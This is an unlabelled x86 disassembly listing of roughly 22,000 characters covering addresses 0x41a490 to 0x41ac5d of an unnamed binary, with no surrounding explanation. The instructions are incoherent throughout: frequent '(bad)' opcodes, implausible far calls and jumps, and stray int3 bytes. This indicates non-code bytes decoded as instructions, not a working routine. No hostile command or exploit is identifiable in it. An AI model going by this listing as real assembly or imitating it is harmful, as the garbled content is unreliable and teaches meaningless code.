  41a490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a491:	inc    DWORD PTR [eax]
  41a493:	(bad)  
  41a495:	data16 add BYTE PTR ds:0x83ffc2,dh
  41a49c:	cmp    DWORD PTR [edx-0x1],0x70
  41a4a0:	cmp    al,0xff
  41a4a2:	dec    ebp
  41a4a4:	ret    
  41a4a5:	aam    0x0
  41a4a7:	shr    eax,1
  41a4a9:	int3   
  41a4aa:	inc    DWORD PTR [eax]
  41a4ac:	mov    ebp,eax
  41a4ae:	call   DWORD PTR ds:0x6100008a
  41a4b4:	push   es
  41a4b5:	loope  0x41a4b6
  41a4b7:	fwait
  41a4b8:	enter  0xff00,0x89
  41a4bc:	add    BYTE PTR [edi-0x7d],dl
  41a4bf:	sbb    eax,0xcd83fff8
  41a4c4:	and    edx,0x833a9eff
  41a4ca:	add    BYTE PTR [eax],al
  41a4cc:	(bad)  
  41a4cd:	out    dx,al
  41a4ce:	jmp    FWORD PTR [ebx-0x26]
  41a4d1:	add    BYTE PTR [eax],al
  41a4d3:	leave  
  41a4d4:	sub    DWORD PTR [edi+edi*8-0xa],0x1b
  41a4d9:	inc    DWORD PTR [ebx+0x9589ff]
  41a4df:	outs   dx,DWORD PTR ds:[esi]
  41a4e0:	mov    edx,0xd863ff83
  41a4e5:	add    BYTE PTR [ebx-0x7c0090],al
  41a4eb:	add    bh,bh
  41a4ed:	out    dx,eax
  41a4ee:	xor    DWORD PTR [ecx+0x63ffff68],0xffffffbb
  41a4f5:	jnp    0x41a4f7
  41a4f7:	stos   BYTE PTR es:[edi],al
  41a4f8:	in     al,0x83
  41a4fa:	(bad)  
  41a4fb:	(bad)  
  41a4fc:	call   DWORD PTR [ebx+0xaff2ff]
  41a502:	call   DWORD PTR [esi+0x21003ac1]
  41a508:	jno    0x41a509
  41a50a:	(bad)  
  41a50b:	(bad)  
  41a50c:	call   FWORD PTR [ebp-0x7d]
  41a50f:	(bad)  
  41a510:	cmp    BYTE PTR [eax],al
  41a512:	call   DWORD PTR [eax-0x29]
  41a515:	mov    esi,0x834246ff
  41a51a:	add    DWORD PTR [eax],0xffffff83
  41a51d:	sbb    BYTE PTR [eax],al
  41a51f:	stc    
  41a520:	xchg   esi,eax
  41a521:	add    bh,bh
  41a523:	aaa    
  41a524:	fs aas 
  41a526:	int3   
  41a527:	pop    ebx
  41a528:	cli    
  41a529:	add    BYTE PTR [ebx-0x76583400],al
  41a52f:	push   es
  41a530:	mov    esi,0x4f378300
  41a535:	sbb    BYTE PTR [eax],al
  41a537:	idiv   bl
  41a539:	int3   
  41a53a:	mov    DWORD PTR [eax],eax
  41a53c:	add    ah,dl
  41a53e:	int3   
  41a53f:	call   0x8eac:0xf5ff83a9
  41a546:	add    dl,dl
  41a548:	cmp    al,0x83
  41a54a:	add    bh,bh
  41a54c:	add    BYTE PTR [edx-0x766f4b01],bh
  41a552:	mov    DWORD PTR [edx+0x2],ebx
  41a555:	jnp    0x41a556
  41a557:	xchg   ebp,eax
  41a558:	pusha  
  41a559:	(bad)  
  41a55a:	(bad)  
  41a55b:	inc    DWORD PTR [eax]
  41a55d:	mov    bh,0x0
  41a55f:	enter  0xcce7,0xff
  41a563:	or     ecx,DWORD PTR [ebx+0x79c7fffe]
  41a569:	dec    DWORD PTR [ecx+0x2800ff]
  41a56f:	test   BYTE PTR [esi-0x7d],bh
  41a572:	add    al,dl
  41a574:	dec    eax
  41a575:	jg     0x41a576
  41a577:	mov    esp,0xffcccc2b
  41a57c:	inc    esp
  41a57e:	(bad)  
  41a57f:	out    dx,eax
  41a580:	sbb    edi,edi
  41a582:	jmp    FWORD PTR [ebx-0x5e]
  41a585:	xchg   DWORD PTR [eax],eax
  41a587:	jb     0x41a52b
  41a589:	add    BYTE PTR [ecx-0x760001],cl
  41a58f:	and    edx,edx
  41a591:	(bad)  
  41a592:	(bad)  
  41a593:	fstp   DWORD PTR [eax-0x2925ffa9]
  41a599:	or     DWORD PTR [ecx+0x77ffcc],0xb
  41a5a0:	cld    
  41a5a1:	add    BYTE PTR [eax],al
  41a5a3:	dec    ebp
  41a5a4:	cmp    BYTE PTR [ebx],ah
  41a5a6:	dec    ebx
  41a5a8:	mov    ds:0xff830000,al
  41a5ad:	or     bh,bh
  41a5af:	lock mov al,ds:0x3835ffff
  41a5b5:	dec    DWORD PTR cs:[ecx]
  41a5b8:	in     eax,0xff
  41a5ba:	dec    esp
  41a5bc:	add    cl,cl
  41a5be:	add    BYTE PTR [edi-0x500000e9],dh
  41a5c4:	int3   
  41a5c5:	out    dx,al
  41a5c6:	inc    DWORD PTR [eax]
  41a5c8:	mov    bl,0xcc
  41a5ca:	add    bh,bh
  41a5cc:	jmp    FWORD PTR [ecx-0xe86701]
  41a5d2:	adc    DWORD PTR [edi+esi*8-0x7edc00e5],0xffffffff
  41a5da:	int3   
  41a5db:	add    ah,cl
  41a5dd:	push   ecx
  41a5de:	push   DWORD PTR [esi]
  41a5e0:	repnz (bad) 
  41a5e2:	(bad)  
  41a5e3:	mov    edx,0xcffd313
  41a5e8:	lea    eax,[eax]
  41a5ea:	inc    DWORD PTR [eax]
  41a5ec:	add    BYTE PTR [eax],dl
  41a5ee:	add    BYTE PTR [ebx+ebx*1-0x34],dl
  41a5f2:	int3   
  41a5f3:	int    0x91
  41a5f5:	xchg   edx,eax
  41a5f6:	int3   
  41a5f7:	fcomp  DWORD PTR [esi+0xffff83]
  41a5fd:	mov    eax,ds:0x34fa83
  41a602:	(bad)  
  41a603:	jp     0x41a651
  41a605:	mov    esi,0xff0abaff
  41a60a:	add    BYTE PTR [ecx+0x4dff26ff],cl
  41a610:	pop    ss
  41a611:	cmp    edi,0x21
  41a614:	dec    esp
  41a615:	mov    ch,0x0
  41a617:	imul   ecx,DWORD PTR [ebx-0x3400],0x48
  41a61e:	dec    DWORD PTR [ebp+0x21ff0040]
  41a624:	aaa    
  41a625:	push   esi
  41a626:	add    BYTE PTR [edi-0xff00d6],cl
  41a62c:	jmp    DWORD PTR [ebp-0x1]
  41a62f:	sbb    dl,BYTE PTR [edi+edi*8+0x0]
  41a633:	inc    esi
  41a634:	xchg   esi,eax
  41a635:	mov    eax,DWORD PTR [eax]
  41a637:	clc    
  41a638:	mov    edi,0xffff00
  41a63d:	(bad)  
  41a63e:	(bad)  
  41a63f:	std    
  41a640:	fs (bad) 
  41a642:	push   DWORD PTR [edi+esi*2]
  41a645:	call   FWORD PTR ds:[edx-0xff5f]
  41a64c:	dec    edx
  41a64e:	mov    DWORD PTR [edi-0x6333003b],ebx
  41a654:	inc    ebx
  41a655:	dec    eax
  41a656:	push   DWORD PTR [edi+0x3a]
  41a659:	add    ah,cl
  41a65b:	(bad)  
  41a65c:	jmp    FWORD PTR [eax+0x868500]
  41a662:	mov    DWORD PTR [edi+ecx*8],ebx
  41a665:	jp     0x41a667
  41a667:	or     bl,ah
  41a669:	dec    esp
  41a66b:	(bad)  
  41a66c:	(bad)  
  41a66d:	cmp    eax,0x4719cc
  41a672:	call   FWORD PTR [eax-0x4c004262]
  41a678:	push   eax
  41a679:	(bad)  
  41a67a:	(bad)  
  41a67b:	inc    DWORD PTR [eax]
  41a67d:	inc    DWORD PTR [eax]
  41a67f:	ffreep st(4)
  41a681:	dec    DWORD PTR [ecx-0x33c60d8c]
  41a687:	xor    eax,0xff83ff67
  41a68c:	inc    DWORD PTR [eax-0x77]
  41a68f:	jno    0x41a64e
  41a691:	add    bh,bh
  41a693:	or     edx,esi
  41a695:	or     al,0xff
  41a697:	mov    eax,ds:0xff00896e
  41a69c:	inc    DWORD PTR [esi]
  41a69e:	and    DWORD PTR [ecx],0x7e
  41a6a1:	(bad)  
  41a6a2:	jmp    FWORD PTR [ecx+0x44]
  41a6a5:	retf   0x1ccc
  41a6a8:	(bad)  
  41a6a9:	dec    esp
  41a6ab:	(bad)  
  41a6ac:	inc    DWORD PTR [eax+0x0]
  41a6af:	imul   ecx,DWORD PTR [ebx],0xffffffff
  41a6b2:	call   FWORD PTR [eax+0x1083e00e]
  41a6b8:	and    al,BYTE PTR [eax]
  41a6ba:	mov    DWORD PTR [eax],eax
  41a6bc:	dec    esp
  41a6be:	add    BYTE PTR [esi],cl
  41a6c0:	lods   eax,DWORD PTR ds:[esi]
  41a6c1:	add    bh,bh
  41a6c3:	ja     0x41a720
  41a6c5:	test   al,0x0
  41a6c7:	ja     0x41a69d
  41a6c9:	inc    DWORD PTR [eax]
  41a6cb:	add    BYTE PTR [ebx+0x124889f2],al
  41a6d1:	inc    DWORD PTR [ebx-0x206cd7]
  41a6d7:	push   edx
  41a6d8:	or     bh,bh
  41a6da:	inc    DWORD PTR [eax]
  41a6dc:	add    BYTE PTR [ebp-0x77],cl
  41a6df:	mov    gs,WORD PTR [ebp+0x4cb889ff]
  41a6e5:	add    al,0xff
  41a6e7:	inc    ebp
  41a6e8:	mov    eax,ds:0xffff0000
  41a6ed:	mov    esp,0x83820700
  41a6f2:	int3   
  41a6f3:	inc    eax
  41a6f4:	and    dh,BYTE PTR [edi]
  41a6f6:	push   DWORD PTR [ecx+ebx*1-0x33000077]
  41a6fd:	mov    ah,0x89
  41a6ff:	sub    BYTE PTR [ebx-0x2bf7ff01],0x33
  41a706:	call   FWORD PTR [ebp+0x1]
  41a709:	inc    DWORD PTR [ebx-0x350100]
  41a70f:	push   ebx
  41a710:	sti    
  41a711:	add    BYTE PTR [eax],al
  41a713:	push   ebp
  41a714:	mov    esi,0x30abff27
  41a719:	inc    DWORD PTR [eax]
  41a71b:	mov    edi,edi
  41a71d:	push   ecx
  41a71e:	mov    DWORD PTR [eax-0xdffff85],ecx
  41a724:	xor    eax,0xead48380
  41a729:	cmp    edi,0xffffffff
  41a72c:	add    BYTE PTR [eax],cl
  41a72e:	call   FWORD PTR ds:0x1783ff56
  41a734:	fisttp QWORD PTR [ebp-0x7c1a0a7d]
  41a73a:	add    BYTE PTR [ebx+0x5083e389],al
  41a740:	popa   
  41a741:	cmp    edi,0x6c
  41a744:	popa   
  41a745:	mov    esp,0x831c6100
  41a74a:	inc    DWORD PTR [eax]
  41a74c:	inc    DWORD PTR [ecx+ecx*4+0x1c]
  41a750:	cld    
  41a751:	inc    DWORD PTR [eax]
  41a753:	retf   0x4cad
  41a756:	call   DWORD PTR [ebp+ecx*2-0x77]
  41a75a:	cmp    edi,0xffffffcc
  41a75d:	stc    
  41a75e:	inc    DWORD PTR [edx+0x3483ff6b]
  41a764:	and    DWORD PTR [esi-0x34],ebx
  41a767:	xchg   ebp,eax
  41a768:	adc    bh,bh
  41a76a:	int3   
  41a76b:	int3   
  41a76c:	add    BYTE PTR [ebx],cl
  41a76e:	int3   
  41a76f:	sbb    eax,0xc8cc83bc
  41a774:	fs ss int3 
  41a777:	aas    
  41a778:	add    cl,ah
  41a77a:	add    BYTE PTR [eax],al
  41a77c:	call   DWORD PTR [edx+0x8dfc00]
  41a782:	add    ah,bl
  41a784:	out    dx,eax
  41a785:	push   0xff45b500
  41a78a:	cmp    edi,0xffffffff
  41a78d:	jl     0x41a78e
  41a78f:	shr    DWORD PTR [eax+eax*1-0x1],cl
  41a793:	inc    edx
  41a794:	js     0x41a803
  41a796:	add    BYTE PTR [ebx],al
  41a798:	loopne 0x41a79a
  41a79a:	inc    DWORD PTR [eax]
  41a79c:	int3   
  41a79d:	mov    ebx,0xfffb7989
  41a7a2:	add    al,dl
  41a7a4:	lods   eax,DWORD PTR ds:[esi]
  41a7a5:	cmp    edi,edi
  41a7a7:	sub    cl,dl
  41a7a9:	int3   
  41a7aa:	dec    DWORD PTR [ecx-0x4000e800]
  41a7b0:	push   cs
  41a7b1:	int3   
  41a7b2:	jmp    DWORD PTR [ebp-0x727c15a0]
  41a7b8:	mov    bh,0x83
  41a7ba:	add    BYTE PTR [eax],al
  41a7bc:	call   DWORD PTR [ebx]
  41a7be:	sbb    edx,0xffffffbb
  41a7c1:	add    BYTE PTR [eax],al
  41a7c3:	mov    dl,0x88
  41a7c5:	dec    esi
  41a7c6:	push   DWORD PTR ds:0x830000ba
  41a7cc:	and    eax,0x0
  41a7cf:	js     0x41a83a
  41a7d1:	cmp    edi,0xffffffd8
  41a7d4:	std    
  41a7d5:	test   DWORD PTR [ecx-0xff301b],ecx
  41a7db:	int3   
  41a7dc:	int3   
  41a7dd:	mov    DWORD PTR [ebx+0xc96f],eax
  41a7e3:	mov    edi,0xf294ffdd
  41a7e9:	add    bh,bh
  41a7eb:	add    DWORD PTR [ebx-0x27187c84],0xffffffff
  41a7f2:	add    BYTE PTR ds:0x3a00e525,ch
  41a7f8:	(bad)  
  41a7f9:	(bad)  
  41a7fa:	(bad)  
  41a7fb:	inc    DWORD PTR [eax]
  41a7fd:	cmp    eax,0xeacbff
  41a802:	add    BYTE PTR [ebx-0x5a],ch
  41a805:	jo     0x41a807
  41a807:	pop    esp
  41a808:	inc    ebp
  41a809:	add    BYTE PTR [eax],al
  41a80b:	add    bh,bh
  41a80d:	cmp    al,BYTE PTR [eax]
  41a80f:	mov    cl,0x38
  41a811:	inc    DWORD PTR [eax]
  41a813:	ins    DWORD PTR es:[edi],dx
  41a814:	mov    cl,BYTE PTR [eax+eax*1]
  41a817:	lahf   
  41a818:	cdq    
  41a819:	(bad)  
  41a81a:	dec    DWORD PTR [ecx-0x14ff2a00]
  41a820:	nop
  41a821:	inc    DWORD PTR [eax]
  41a823:	mov    ebp,edi
  41a825:	push   esp
  41a826:	add    BYTE PTR [edx],bl
  41a828:	xchg   edi,eax
  41a829:	add    DWORD PTR [eax],0xffffff83
  41a82c:	dec    DWORD PTR [ebx]
  41a82e:	dec    DWORD PTR [ecx]
  41a830:	push   ds
  41a831:	(bad)  
  41a832:	(bad)  
  41a833:	jle    0x41a7fe
  41a835:	in     al,0x83
  41a837:	call   0xc8ff:0xff8383a0
  41a83e:	call   DWORD PTR [ebx-0x51]
  41a841:	add    BYTE PTR [eax],al
  41a843:	scas   eax,DWORD PTR es:[edi]
  41a844:	sbb    BYTE PTR [eax+0x0],cl
  41a847:	and    eax,0xffffff5f
  41a84c:	add    BYTE PTR [ecx+0x842700],al
  41a852:	dec    DWORD PTR [eax+0x3b007756]
  41a858:	lea    eax,[eax]
  41a85a:	(bad)  
  41a85b:	(bad)  
  41a85c:	call   FWORD PTR [edi+edi*8-0x760006c7]
  41a863:	adc    al,0x19
  41a865:	aad    0xff
  41a867:	inc    esi
  41a868:	dec    eax
  41a869:	inc    DWORD PTR [eax]
  41a86b:	add    bh,bh
  41a86d:	sti    
  41a86e:	add    cl,ch
  41a870:	lods   eax,DWORD PTR ds:[esi]
  41a871:	int3   
  41a872:	add    BYTE PTR [edi-0x3800171c],ch
  41a878:	ins    DWORD PTR es:[edi],dx
  41a879:	(bad)  
  41a87a:	(bad)  
  41a87b:	inc    DWORD PTR [eax]
  41a87d:	(bad)  
  41a87f:	test   DWORD PTR [ebx+eax*4],edx
  41a882:	(bad)  
  41a883:	mov    ecx,0x32008876
  41a888:	xor    edi,edi
  41a88a:	add    bh,bh
  41a88c:	jmp    FWORD PTR [edx]
  41a88e:	add    BYTE PTR [edi-0x6f],ah
  41a891:	add    BYTE PTR [ebx-0xf33c15],al
  41a897:	mov    edi,0xff89ff10
  41a89c:	inc    edx
  41a89e:	add    BYTE PTR [esi+0x21],cl
  41a8a1:	inc    DWORD PTR [eax]
  41a8a3:	cmp    BYTE PTR [edx],ch
  41a8a5:	sbb    al,BYTE PTR [eax]
  41a8a7:	test   DWORD PTR [ecx],0xccff0000
  41a8ad:	xor    DWORD PTR cs:[esi-0x36],0xffffffff
  41a8b2:	jmp    DWORD PTR [ebx+0x30]
  41a8b5:	add    edi,edi
  41a8b7:	ret    
  41a8b8:	dec    esp
  41a8b9:	add    BYTE PTR [eax],al
  41a8bb:	add    bh,bh
  41a8bd:	add    eax,0x1aaaff
  41a8c2:	inc    DWORD PTR [ebx]
  41a8c4:	xchg   ebp,eax
  41a8c5:	add    BYTE PTR [ebx-0x76ff8b5f],0xff
  41a8cc:	mov    DWORD PTR [edi+0x0],ecx
  41a8cf:	xor    BYTE PTR [ecx+ecx*4-0x1ba66800],bh
  41a8d6:	int3   
  41a8d7:	inc    eax
  41a8d8:	add    DWORD PTR es:[eax],0xffffff83
  41a8dc:	(bad)  
  41a8dd:	out    dx,eax
  41a8de:	xor    DWORD PTR [esi],0xfffffffe
  41a8e1:	inc    DWORD PTR [ebx-0x109d70]
  41a8e7:	dec    esp
  41a8e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e9:	(bad)  
  41a8ea:	(bad)  
  41a8eb:	(bad)  
  41a8ec:	dec    DWORD PTR [eax+eax*1-0x76007d39]
  41a8f3:	pop    ebx
  41a8f4:	jmp    0x0:0x217a0096
  41a8fb:	add    bh,bh
  41a8fd:	and    al,BYTE PTR [eax]
  41a8ff:	cmp    bl,bl
  41a901:	inc    DWORD PTR [eax]
  41a903:	cmp    al,0x7c
  41a905:	mov    ebx,0xffd76fff
  41a90a:	dec    DWORD PTR [ecx-0x2ff5401]
  41a910:	adc    bh,bh
  41a912:	mov    DWORD PTR [edi-0x1ff5ec1],ebx
  41a918:	xchg   esi,eax
  41a919:	add    BYTE PTR [eax],al
  41a91b:	inc    DWORD PTR [eax]
  41a91d:	jg     0x41a91e
  41a91f:	dec    esi
  41a920:	(bad)  
  41a921:	(bad)  
  41a922:	push   DWORD PTR [esi]
  41a924:	icebp  
  41a925:	add    al,0xff
  41a927:	jle    0x41a95d
  41a929:	(bad)  
  41a92a:	(bad)  
  41a92b:	(bad)  
  41a92c:	call   FWORD PTR [edi+0x588cff]
  41a932:	add    ch,bh
  41a934:	jns    0x41a8eb
  41a936:	jmp    DWORD PTR [ebx]
  41a938:	out    dx,al
  41a939:	inc    DWORD PTR [ebx-0x120000]
  41a93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a940:	nop
  41a941:	int3   
  41a942:	add    bl,dh
  41a944:	je     0x41a931
  41a946:	mov    DWORD PTR [ebp+0x22],eax
  41a949:	inc    DWORD PTR [eax]
  41a94b:	add    bh,bh
  41a94d:	arpl   di,di
  41a94f:	popf   
  41a950:	inc    esi
  41a951:	(bad)  
  41a952:	jmp    FWORD PTR [ecx+ecx*1-0x36]
  41a956:	add    cl,bl
  41a958:	cli    
  41a959:	cmp    edi,0xffffff89
  41a95c:	int3   
  41a95d:	push   edi
  41a95e:	int3   
  41a95f:	lea    ebx,[edx]
  41a961:	add    BYTE PTR [eax],al
  41a963:	xor    dl,BYTE PTR cs:[esi-0xf96077]
  41a96a:	inc    DWORD PTR [eax]
  41a96c:	add    BYTE PTR [eax-0x34],dl
  41a96f:	push   esi
  41a970:	or     bh,bh
  41a972:	adc    esp,0x49
  41a975:	dec    esi
  41a976:	inc    edi
  41a978:	jno    0x41a97a
  41a97a:	dec    DWORD PTR [ecx-0x8ffd000]
  41a980:	adc    eax,0xf82800ff
  41a985:	popa   
  41a986:	dec    DWORD PTR ds:0xffffffdb
  41a98c:	add    BYTE PTR [ebp-0x1],ah
  41a98f:	xchg   DWORD PTR [esi],eax
  41a991:	(bad)  
  41a992:	push   DWORD PTR [ecx-0x7700d085]
  41a998:	(bad)  
  41a99a:	(bad)  
  41a99b:	(bad)  
  41a99c:	dec    DWORD PTR [ebx-0x1]
  41a99f:	ror    DWORD PTR [ecx-0x34],1
  41a9a2:	add    DWORD PTR [edi+0x7e],0xc
  41a9a6:	mov    ebx,esp
  41a9a8:	add    bh,bh
  41a9aa:	mov    DWORD PTR [eax],eax
  41a9ac:	add    BYTE PTR [eax-0x7d],dl
  41a9af:	jb     0x41a9dc
  41a9b1:	(bad)  
  41a9b2:	inc    DWORD PTR [edi*4+0x76ff0029]
  41a9b9:	add    DWORD PTR [eax],0x0
  41a9bc:	xor    DWORD PTR [edi+edi*8+0x29],0xffffffac
  41a9c1:	(bad)  
  41a9c2:	jmp    DWORD PTR [edx-0x1e]
  41a9c5:	xchg   ecx,eax
  41a9c6:	(bad)  
  41a9c7:	mov    ecx,0xffffffba
  41a9cc:	xor    DWORD PTR [eax],0xffffffff
  41a9cf:	test   BYTE PTR [ecx-0x1e7c3301],0x45
  41a9d6:	push   edx
  41a9d8:	sbb    al,0x0
  41a9da:	add    BYTE PTR [ebx-0x5e004701],al
  41a9e0:	lods   al,BYTE PTR ds:[esi]
  41a9e1:	add    BYTE PTR [eax],al
  41a9e3:	mov    ebx,0x4bff44d3
  41a9e8:	bound  eax,QWORD PTR [eax]
  41a9ea:	add    ah,cl
  41a9ec:	jmp    DWORD PTR ds:0x838ae900
  41a9f2:	jmp    DWORD PTR [edx-0xa]
  41a9f5:	jbe    0x41a9f7
  41a9f7:	es mov ebx,0xffffccff
  41a9fd:	dec    BYTE PTR [ecx-0x5ac3]
  41aa03:	fdiv   DWORD PTR gs:[eax-0x34]
  41aa07:	adc    WORD PTR [ecx+0x3bff00cc],cx
  41aa0e:	call   FWORD PTR [eax-0x74ff00a0]
  41aa14:	mov    ch,BYTE PTR [ebx-0x1]
  41aa17:	lds    esp,FWORD PTR [ecx-0x7d]
  41aa1a:	add    BYTE PTR [eax],al
  41aa1c:	mov    DWORD PTR [ecx],ecx
  41aa1e:	push   DWORD PTR [ebx-0x69007cab]
  41aa24:	call   0x1fb6333c
  41aa29:	inc    DWORD PTR [eax]
  41aa2b:	add    BYTE PTR [ebx-0x72e433c4],al
  41aa31:	add    BYTE PTR [eax],al
  41aa33:	sar    DWORD PTR [eax+eax*1-0x7c285900],cl
  41aa3a:	mov    DWORD PTR [ecx-0x257c0b01],ecx
  41aa40:	popf   
  41aa41:	add    bh,bh
  41aa43:	popf   
  41aa44:	fmul   DWORD PTR [eax-0xbbc600]
  41aa4a:	add    bh,bh
  41aa4c:	add    DWORD PTR [edx-0x34],0x1d
  41aa50:	or     eax,DWORD PTR [eax]
  41aa52:	or     ebp,0x37
  41aa55:	loopne 0x41aa56
  41aa57:	jae    0x41a9da
  41aa59:	int3   
  41aa5a:	inc    DWORD PTR [ebx+0x47ff6589]
  41aa60:	sbb    DWORD PTR [ebx-0x7cdf9777],eax
  41aa66:	jmp    DWORD PTR [ebx]
  41aa68:	lods   eax,DWORD PTR ds:[esi]
  41aa69:	dec    esp
  41aa6b:	inc    DWORD PTR [eax]
  41aa6d:	mov    ecx,0x319100
  41aa72:	jmp    ecx
  41aa74:	xor    eax,0xe96789aa
  41aa79:	add    BYTE PTR [ecx-0x76b7ff01],cl
  41aa7f:	pop    edx
  41aa80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa81:	add    ah,cl
  41aa83:	lock push DWORD PTR [esi-0x7d]
  41aa87:	mov    bh,0xba
  41aa89:	(bad)  
  41aa8a:	dec    DWORD PTR [ecx-0x1d001900]
  41aa90:	lea    eax,[eax]
  41aa92:	mov    DWORD PTR [ecx-0x4900d2b6],esp
  41aa98:	ud0    ecx,esp
  41aa9b:	add    bh,bh
  41aa9d:	out    dx,eax
  41aa9e:	mov    DWORD PTR [edi-0x2b],edx
  41aaa1:	add    DWORD PTR [ebx-0x6f54a6],0xffffffd0
  41aaa8:	arpl   di,di
  41aaaa:	add    bh,bh
  41aaac:	jmp    DWORD PTR [edi+edi*8+0xffd582]
  41aab3:	inc    esp
  41aab4:	cs retf 0x4600
  41aab8:	or     DWORD PTR [eax],eax
  41aaba:	inc    DWORD PTR [eax]
  41aabc:	jmp    DWORD PTR [eax]
  41aabe:	add    dl,ch
  41aac0:	leave  
  41aac1:	add    DWORD PTR [ebx-0x6952ab],0xffffffe4
  41aac8:	aaa    
  41aac9:	add    DWORD PTR [ebx-0x7c347c01],0x6b
  41aad0:	push   es
  41aad1:	(bad)  
  41aad2:	jmp    DWORD PTR ds:0xedff2888
  41aad8:	dec    esp
  41aad9:	(bad)  
  41aada:	inc    DWORD PTR [eax]
  41aadc:	mov    DWORD PTR [esi+0x413f00],edi
  41aae2:	inc    DWORD PTR [ebx-0x1ff5160]
  41aae8:	push   esp
  41aae9:	(bad)  
  41aaea:	(bad)  
  41aaeb:	inc    DWORD PTR [eax]
  41aaed:	pop    ds
  41aaee:	push   DWORD PTR [ebx]
  41aaf0:	jmp    0x41aaf1
  41aaf2:	mov    DWORD PTR [ecx+0x65],esp
  41aaf5:	xor    al,BYTE PTR [ebx-0x337c8cc8]
  41aafb:	add    bh,bh
  41aafd:	les    eax,FWORD PTR [eax]
  41aaff:	sar    DWORD PTR [ecx],cl
  41ab01:	(bad)  
  41ab02:	(bad)  
  41ab03:	mov    edx,0xfa83c962
  41ab08:	sar    edi,0xcc
  41ab0b:	add    DWORD PTR [ebx+0x5261ffe9],0x0
  41ab12:	jmp    ebp
  41ab14:	rcr    DWORD PTR [edi],1
  41ab16:	add    bl,dl
  41ab18:	pop    DWORD PTR [eax]
  41ab1a:	add    bh,bh
  41ab1c:	dec    esp
  41ab1e:	add    esp,0xffffffc8
  41ab21:	dec    DWORD PTR [ecx-0x76f14180]
  41ab27:	dec    ecx
  41ab28:	lahf   
  41ab29:	mov    DWORD PTR [ebx+0xc9ff00],eax
  41ab2f:	inc    esp
  41ab30:	gs mov esp,ecx
  41ab33:	jae    0x41aacc
  41ab35:	jl     0x41ab03
  41ab37:	cmc    
  41ab38:	jne    0x41ab39
  41ab3a:	add    BYTE PTR [eax],al
  41ab3c:	add    bh,ah
  41ab3e:	add    BYTE PTR [esi],ah
  41ab40:	jge    0x41ab42
  41ab42:	jmp    FWORD PTR [ebx-0x35ffa136]
  41ab48:	out    dx,eax
  41ab49:	(bad)  
  41ab4a:	inc    DWORD PTR [eax]
  41ab4c:	call   DWORD PTR [ecx]
  41ab4e:	add    BYTE PTR [edi-0x72000078],bl
  41ab54:	push   ecx
  41ab55:	inc    eax
  41ab56:	(bad)  
  41ab57:	out    dx,eax
  41ab58:	or     eax,DWORD PTR [eax]
  41ab5a:	add    DWORD PTR [eax],0xffffffff
  41ab5d:	xchg   esi,eax
  41ab5e:	add    BYTE PTR [edi],bh
  41ab60:	sbb    eax,DWORD PTR [ebx-0x46ab4e01]
  41ab66:	add    bl,cl
  41ab68:	ror    DWORD PTR [ecx-0x76ff0100],0xff
  41ab6f:	and    al,0xf2
  41ab71:	mov    DWORD PTR [ebx+0x12561a],eax
  41ab77:	xchg   ebx,eax
  41ab78:	adc    DWORD PTR [ebx+0x510083ff],eax
  41ab7e:	push   esp
  41ab80:	or     BYTE PTR [eax],al
  41ab82:	push   DWORD PTR [edx-0x133c4ea]
  41ab88:	lea    eax,[ebx-0x75ff337d]
  41ab8e:	add    BYTE PTR [edi+0x22],ah
  41ab91:	add    BYTE PTR [eax],al
  41ab93:	lods   eax,DWORD PTR ds:[esi]
  41ab94:	sub    eax,0xf3e8cc4e
  41ab99:	inc    DWORD PTR [eax]
  41ab9b:	add    BYTE PTR [eax],al
  41ab9d:	cmp    bh,bh
  41ab9f:	jno    0x41ab47
  41aba1:	(bad)  
  41aba2:	jmp    FWORD PTR [ebp+0x400be54]
  41aba8:	inc    esp
  41aba9:	int3   
  41abaa:	add    DWORD PTR [eax],0xffffff89
  41abad:	ins    DWORD PTR es:[edi],dx
  41abae:	inc    DWORD PTR [ebx-0x747c0031]
  41abb4:	sahf   
  41abb5:	pop    ebp
  41abb6:	and    DWORD PTR [edx+0x5b],0xffffff89
  41abba:	int3   
  41abbb:	(bad)  
  41abbc:	(bad)  
  41abbd:	inc    DWORD PTR [eax]
  41abbf:	test   BYTE PTR ds:0xa5410089,0x9a
  41abc6:	push   DWORD PTR [ebx-0xa5]
  41abcc:	int3   
  41abcd:	cmp    eax,0x7d9bff
  41abd2:	push   DWORD PTR [ebx]
  41abd4:	mov    ecx,0x66b4ffaa
  41abd9:	(bad)  
  41abda:	(bad)  
  41abdb:	inc    DWORD PTR [ebx+0x8d1ff66]
  41abe1:	add    BYTE PTR [ebx-0x7c1280b7],al
  41abe7:	fldcw  WORD PTR [edi+edi*8+0x0]
  41abeb:	inc    DWORD PTR [ebx+0x71cf830a]
  41abf1:	(bad)  
  41abf2:	dec    DWORD PTR [esi]
  41abf4:	bound  esp,QWORD PTR [eax+eax*1-0xf42c]
  41abfb:	cmp    edi,0xffffffa8
  41abfe:	add    BYTE PTR [esi],dh
  41ac00:	jmp    0xf3:0x7a53ff89
  41ac07:	leave  
  41ac08:	clc    
  41ac09:	add    BYTE PTR [ebx-0x33d8ff01],al
  41ac0f:	mov    bh,0x11
  41ac11:	(bad)  
  41ac12:	dec    DWORD PTR [ecx+0x5dff37b8]
  41ac18:	mov    al,ds:0xcccc89
  41ac1d:	and    bh,bh
  41ac1f:	mov    dl,0x87
  41ac21:	add    BYTE PTR [eax],al
  41ac23:	mov    DWORD PTR [esi-0x6f],ebx
  41ac26:	add    BYTE PTR [ebx],ah
  41ac28:	inc    eax
  41ac29:	add    BYTE PTR [eax],al
  41ac2b:	add    ah,cl
  41ac2d:	mov    ebp,0xffcb5983
  41ac32:	add    BYTE PTR [edx],ch
  41ac34:	mov    ebp,DWORD PTR [eax+eax*1+0xff1e31]
  41ac3b:	add    bh,bh
  41ac3d:	mov    bh,bh
  41ac3f:	add    al,0x8a
  41ac41:	add    BYTE PTR [ecx-0xe8eeac],cl
  41ac47:	mov    ch,0x2a
  41ac49:	inc    DWORD PTR [eax]
  41ac4b:	inc    DWORD PTR [eax]
  41ac4d:	outs   dx,BYTE PTR ds:[esi]
  41ac4e:	push   DWORD PTR [ebp-0x37]
  41ac51:	mov    edi,edi
  41ac53:	jecxz  0x41abda
  41ac55:	xchg   bh,bh
  41ac57:	inc    esi
  41ac58:	(bad)  
  41ac5a:	add    BYTE PTR [eax],al
  41ac5c:	int3   
  41ac5d:	test   BYTE PTR [ebx-0x51cd],0x74
